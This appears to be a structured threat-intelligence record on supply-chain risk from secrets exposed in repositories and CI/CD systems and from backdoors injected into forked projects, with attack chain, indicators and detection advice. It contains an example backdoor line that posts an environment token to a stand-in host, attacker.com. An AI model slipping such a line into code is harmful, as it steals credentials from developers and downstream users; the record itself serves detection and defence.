package_info.package_manager: GitHub, npm, PyPI, Travis CI, CircleCI
package_info.package_versions: N/A (applies to all versions where secrets are exposed)
package_info.why_malicious: The report describes a pattern of malicious activity where attackers exploit exposed secrets (tokens, keys, credentials) in code repositories and CI/CD platforms to gain unauthorized access to sensitive systems, data, and infrastructure. Attackers also inject backdoors into forked open-source projects, furthering the risk of supply chain compromise.

execution_context.file_location: environment variables, configuration files, code repositories (e.g., .env, config.yml, source code)

malicious_snippets.code_snippet: export AWS_SECRET_ACCESS_KEY=AKIA...; export DB_PASSWORD=supersecret; # or hardcoded in source code
malicious_snippets.code_behavior: At runtime or during CI/CD execution, the code loads sensitive secrets (API keys, tokens, passwords) from environment variables or hardcoded values, which are then accessible to anyone with repository access or through logs, enabling credential theft and unauthorized access.

malice_analysis.why_suspicious: Storing secrets in plaintext or in code repositories exposes them to anyone with access, including attackers scanning public or private repos.
malice_analysis.violated_expectations: Best practices dictate secrets should be managed securely (e.g., via secret managers), not stored in code or config files.
malice_analysis.similar_legitimate_use: Developers may temporarily store secrets for local testing, but this should never reach production or shared repositories.
key_indicators: Presence of API keys, tokens, or passwords in code or config files
Secrets referenced in environment variables in CI/CD configs
Secrets appearing in commit history or logs

execution_context.file_location: maliciously forked open-source repositories (e.g., GitHub forks)

malicious_snippets.code_snippet:
// Malicious backdoor injected in forked repo
fetch('https://attacker.com/collect', { method: 'POST', body: JSON.stringify({ token: process.env.SECRET_TOKEN }) });
malicious_snippets.code_behavior: At import-time or runtime, the code exfiltrates secrets (e.g., tokens) from environment variables to an attacker-controlled domain, enabling credential theft and further compromise.

malice_analysis.why_suspicious: Unexpected network requests to external domains, especially sending sensitive data, are a hallmark of malicious code.
malice_analysis.violated_expectations: Legitimate open-source code should not exfiltrate secrets or make unsolicited network requests.
malice_analysis.similar_legitimate_use: Telemetry or error reporting (with user consent and no secrets) may send data externally.
key_indicators: Network requests to unknown or suspicious domains
Use of environment variables containing secrets in outbound requests
Code only present in forked or modified repositories

attack_chain.action: Secrets (tokens, keys, credentials) are accidentally committed to public or private code repositories or stored insecurely in CI/CD environment variables.
attack_chain.leads_to: Attackers scan repositories and discover exposed secrets.

attack_chain.action: Attackers use automated tools to rapidly detect and harvest exposed secrets (sometimes within seconds of exposure).
attack_chain.leads_to: Attackers gain unauthorized access to sensitive systems, cloud resources, or third-party services.

attack_chain.action: Attackers inject malicious code (backdoors) into forked or cloned open-source repositories to further compromise downstream users.
attack_chain.leads_to: Malicious code exfiltrates additional secrets or enables further attacks on supply chain consumers.

attack_chain.action: Stolen secrets are used to access production systems, exfiltrate data, or move laterally within victim organizations.
attack_chain.leads_to: Data breaches, supply chain compromise, and further exploitation.

behavioral_signatures: Presence of API keys, tokens, or passwords in code, config files, or environment variables
Unusual or unsolicited outbound network requests from build or runtime environments
Rapid access or cloning of repositories following secret exposure
Unexpected modifications or forks of popular open-source projects
file_indicators: Secrets in commit history or CI/CD pipeline logs
Malicious code in forked repositories not present in upstream
network_indicators: Outbound requests to unknown or attacker-controlled domains (e.g., webhook.site, pastebin, custom C2 servers)
API calls to cloud providers or third-party services using exposed tokens
detection_knowledge.how_to_detect: Continuously scan code repositories (public and private) and CI/CD configurations for exposed secrets using automated tools. Monitor for unexpected outbound network requests from build and runtime environments, especially those containing sensitive data. Alert on the presence of secrets in code, config files, or logs, and on suspicious modifications or forks of open-source projects. Implement secret scanning as part of the CI/CD pipeline and enforce secret management best practices.
